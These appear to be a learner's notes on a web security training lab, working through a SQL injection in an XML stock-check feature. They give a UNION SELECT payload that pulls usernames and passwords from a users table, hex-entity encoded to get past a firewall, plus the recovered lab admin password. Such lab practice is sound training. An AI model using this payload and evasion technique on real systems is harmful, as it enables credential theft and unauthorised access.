TASK:
This lab contains a SQL injection vulnerability in its
 stock check feature. The results from the query are 
 returned in the application's response, so you can 
 use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains 
the usernames and passwords of registered users. 
To solve the lab, perform a SQL injection attack 
to retrieve the admin user's credentials, then log 
in to their account.


SQL for PS server side when checking stock 
level for Com-Tool in London:

SELECT COUNT(productId)
FROM Product
WHERE storeId = 1

this returns 610 


What i need to modify the code to do to return
username and password:
SELECT COUNT(productId)
FROM Product
WHERE storeId = 1 UNION SELECT NULL

This should get the number of columns in the table, however 
the response gave "attack detected"

In order to do this we must bypass the WAF

We must obfuscate the payload using XML enetities

Using the Hackvertor extension, go to encodings as we want to encode the SQL injection as a hex entity 
for the application to not be suspicious of the tampered with XML payload

derive a UNION SELECT inside the hex encoding

the UNION SELECT must however be split using this || '~' || as the database returns only one column in the select statement.

In the repeater typing in this will work:
<storeId>
    <@hex_entities>
        1 UNION SELECT username || '~' || password FROM users
    <@/hex_entities>
</storeId>


username:
administrator
password:
cj44qymkg9kwiycnp6cm
